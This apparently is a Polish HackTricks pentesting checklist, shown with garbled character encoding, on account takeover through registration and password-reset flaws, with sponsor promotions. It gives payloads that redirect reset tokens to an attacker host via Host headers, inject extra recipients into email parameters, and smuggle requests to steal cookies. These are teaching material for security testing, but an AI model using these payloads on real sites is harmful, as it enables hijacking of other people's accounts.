# Luki i podatnoÅ›ci na przejÄ™cie rejestracji

<details>

<summary><strong>Nauka hakowania AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakowania, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) na GitHubie.

</details>

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana przez **dark web**, ktÃ³ra oferuje **darmowe** funkcje sprawdzania, czy firma lub jej klienci nie zostali **skompromitowani** przez **zÅ‚oÅ›liwe oprogramowanie kradnÄ…ce informacje**.

Ich gÅ‚Ã³wnym celem WhiteIntel jest zwalczanie przejÄ™Ä‡ kont i atakÃ³w ransomware wynikajÄ…cych z zÅ‚oÅ›liwego oprogramowania kradnÄ…cego informacje.

MoÅ¼esz sprawdziÄ‡ ich stronÄ™ internetowÄ… i wyprÃ³bowaÄ‡ ich silnik za **darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

***

## PrzejÄ™cie rejestracji

### Duplikacja rejestracji

* SprÃ³buj wygenerowaÄ‡ uÅ¼ywajÄ…c istniejÄ…cej nazwy uÅ¼ytkownika
* SprawdÅº zmieniajÄ…c adres e-mail:
* wielkie litery
* \+1@
* dodaj kropkÄ™ w adresie e-mail
* znaki specjalne w nazwie e-maila (%00, %09, %20)
* Dodaj czarne znaki po adresie e-mail: `test@test.com a`
* victim@gmail.com@attacker.com
* victim@attacker.com@gmail.com

### Wyliczanie nazwy uÅ¼ytkownika

SprawdÅº, czy moÅ¼esz ustaliÄ‡, kiedy nazwa uÅ¼ytkownika zostaÅ‚a juÅ¼ zarejestrowana w aplikacji.

### Polityka hasÅ‚a

TworzÄ…c uÅ¼ytkownika, sprawdÅº politykÄ™ hasÅ‚a (sprawdÅº, czy moÅ¼na uÅ¼ywaÄ‡ sÅ‚abych haseÅ‚).\
W takim przypadku moÅ¼esz sprÃ³bowaÄ‡ przeprowadziÄ‡ atak bruteforce na dane uwierzytelniajÄ…ce.

### WstrzykniÄ™cie SQL

[**SprawdÅº tÄ™ stronÄ™** ](sql-injection/#insert-statement), aby dowiedzieÄ‡ siÄ™, jak prÃ³bowaÄ‡ przejmowaÄ‡ konta lub wydobywaÄ‡ informacje za pomocÄ… **WstrzykniÄ™Ä‡ SQL** w formularzach rejestracyjnych.

### PrzejÄ™cia Oauth

{% content-ref url="oauth-to-account-takeover.md" %}
[oauth-to-account-takeover.md](oauth-to-account-takeover.md)
{% endcontent-ref %}

### PodatnoÅ›ci SAML

{% content-ref url="saml-attacks/" %}
[saml-attacks](saml-attacks/)
{% endcontent-ref %}

### Zmiana adresu e-mail

Po zarejestrowaniu sprÃ³buj zmieniÄ‡ adres e-mail i sprawdÅº, czy ta zmiana jest poprawnie zweryfikowana lub czy moÅ¼na zmieniÄ‡ jÄ… na dowolne adresy e-mail.

### Dodatkowe sprawdzenia

* SprawdÅº, czy moÅ¼na uÅ¼ywaÄ‡ **adresÃ³w e-mail jednorazowego uÅ¼ytku**
* **DÅ‚ugie** **hasÅ‚o** (>200) prowadzi do **DoS**
* **SprawdÅº limity szybkoÅ›ci tworzenia kont**
* UÅ¼yj username@**burp\_collab**.net i przeanalizuj **wywoÅ‚anie zwrotne**

## **PrzejÄ™cie resetowania hasÅ‚a**

### Wyciek tokena resetowania hasÅ‚a za poÅ›rednictwem referenta <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. PoproÅ› o zresetowanie hasÅ‚a na swÃ³j adres e-mail
2. Kliknij w link resetowania hasÅ‚a
3. Nie zmieniaj hasÅ‚a
4. Kliknij na dowolne strony zewnÄ™trzne (np. Facebook, Twitter)
5. PrzechwyÄ‡ Å¼Ä…danie w proxy Burp Suite
6. SprawdÅº, czy nagÅ‚Ã³wek referer wycieka token resetowania hasÅ‚a.

### Zatrucie resetowania hasÅ‚a <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. PrzechwyÄ‡ Å¼Ä…danie resetowania hasÅ‚a w Burp Suite
2. Dodaj lub edytuj nastÄ™pujÄ…ce nagÅ‚Ã³wki w Burp Suite: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. PrzekaÅ¼ Å¼Ä…danie z zmodyfikowanym nagÅ‚Ã³wkiem\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Szukaj adresu URL resetowania hasÅ‚a na podstawie _nagÅ‚Ã³wka hosta_ jak : `https://attacker.com/reset-password.php?token=TOKEN`

### Resetowanie hasÅ‚a za pomocÄ… parametru e-mail <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```powershell
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR na parametrach API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. AtakujÄ…cy musi zalogowaÄ‡ siÄ™ na swoje konto i przejÅ›Ä‡ do funkcji **ZmieÅ„ hasÅ‚o**.
2. Uruchom Burp Suite i przechwyÄ‡ Å¼Ä…danie.
3. WyÅ›lij je do karty repeater i edytuj parametry: ID uÅ¼ytkownika/email\
`powershell POST /api/changepass [...] ("form": {"email":"ofiara@email.com","password":"bezpiecznehaslo"})`

### SÅ‚aby token resetowania hasÅ‚a <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Token resetowania hasÅ‚a powinien byÄ‡ generowany losowo i unikalny za kaÅ¼dym razem.\
SprÃ³buj okreÅ›liÄ‡, czy token wygasa, czy zawsze jest taki sam, w niektÃ³rych przypadkach algorytm generowania jest sÅ‚aby i moÅ¼e byÄ‡ odgadniÄ™ty. NastÄ™pujÄ…ce zmienne mogÄ… byÄ‡ uÅ¼ywane przez algorytm.

* Znacznik czasu
* ID uÅ¼ytkownika
* Email uÅ¼ytkownika
* ImiÄ™ i nazwisko
* Data urodzenia
* Kryptografia
* Tylko liczby
* KrÃ³tka sekwencja tokena (znaki miÄ™dzy \[A-Z,a-z,0-9])
* Ponowne uÅ¼ycie tokenu
* Data wygaÅ›niÄ™cia tokenu

### WyciekajÄ…cy token resetowania hasÅ‚a <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. WywoÅ‚aj Å¼Ä…danie resetowania hasÅ‚a za pomocÄ… interfejsu API/UI dla okreÅ›lonego adresu e-mail, np. test@mail.com
2. SprawdÅº odpowiedÅº serwera i sprawdÅº `resetToken`
3. NastÄ™pnie uÅ¼yj tokenu w adresie URL, np. `https://przykÅ‚ad.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Resetowanie hasÅ‚a poprzez kolizjÄ™ nazwy uÅ¼ytkownika <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Zarejestruj siÄ™ w systemie z nazwÄ… uÅ¼ytkownika identycznÄ… z nazwÄ… uÅ¼ytkownika ofiary, ale z biaÅ‚ymi znakami wstawionymi przed i/lub po nazwie uÅ¼ytkownika, np. `"admin "`
2. PoproÅ› o zresetowanie hasÅ‚a za pomocÄ… swojej zÅ‚oÅ›liwej nazwy uÅ¼ytkownika.
3. UÅ¼yj otrzymanego tokenu w e-mailu i zresetuj hasÅ‚o ofiary.
4. Zaloguj siÄ™ na konto ofiary za pomocÄ… nowego hasÅ‚a.

Platforma CTFd byÅ‚a podatna na ten atak.\
Zobacz: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### PrzejÄ™cie konta poprzez atak typu Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. ZnajdÅº XSS wewnÄ…trz aplikacji lub subdomenie, jeÅ›li ciasteczka sÄ… ograniczone do domeny nadrzÄ™dnej: `*.domena.com`
2. Wyciekaj bieÅ¼Ä…ce **ciasteczka sesji**
3. Uwierzytelnij siÄ™ jako uÅ¼ytkownik, korzystajÄ…c z ciasteczka

### PrzejÄ™cie konta poprzez HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1\. UÅ¼yj **smuggler** do wykrycia typu HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2\. StwÃ³rz Å¼Ä…danie, ktÃ³re nadpisze `POST / HTTP/1.1` nastÄ™pujÄ…cymi danymi:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` z celem przekierowania ofiar do burpcollab i kradzieÅ¼y ich ciasteczek\
3\. Ostateczne Å¼Ä…danie moÅ¼e wyglÄ…daÄ‡ nastÄ™pujÄ…co
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
### PrzejÄ™cie Konta za pomocÄ… CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. StwÃ³rz Å‚adunek dla CSRF, np. "Formularz HTML z automatycznym przesÅ‚aniem zmiany hasÅ‚a"
2. WyÅ›lij Å‚adunek

### PrzejÄ™cie Konta za pomocÄ… JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

Token JSON Web moÅ¼e byÄ‡ uÅ¼ywany do uwierzytelniania uÅ¼ytkownika.

* Edytuj JWT z innym identyfikatorem uÅ¼ytkownika / adresem e-mail
* SprawdÅº sÅ‚abÄ… sygnaturÄ™ JWT

{% content-ref url="hacking-jwt-json-web-tokens.md" %}
[hacking-jwt-json-web-tokens.md](hacking-jwt-json-web-tokens.md)
{% endcontent-ref %}

## OdnoÅ›niki

* [https://salmonsec.com/cheatsheet/account\_takeover](https://salmonsec.com/cheatsheet/account\_takeover)

### [WhiteIntel](https://whiteintel.io)

<figure><img src="../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>

[**WhiteIntel**](https://whiteintel.io) to wyszukiwarka zasilana przez **dark web**, ktÃ³ra oferuje **darmowe** funkcje do sprawdzania, czy firma lub jej klienci nie zostali **skompromitowani** przez **zÅ‚oÅ›liwe oprogramowanie kradnÄ…ce informacje**.

Ich gÅ‚Ã³wnym celem WhiteIntel jest zwalczanie przejÄ™Ä‡ kont i atakÃ³w ransomware wynikajÄ…cych z zÅ‚oÅ›liwego oprogramowania kradnÄ…cego informacje.

MoÅ¼esz odwiedziÄ‡ ich stronÄ™ internetowÄ… i wyprÃ³bowaÄ‡ ich silnik **za darmo** pod adresem:

{% embed url="https://whiteintel.io" %}

<details>

<summary><strong>Dowiedz siÄ™, jak hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
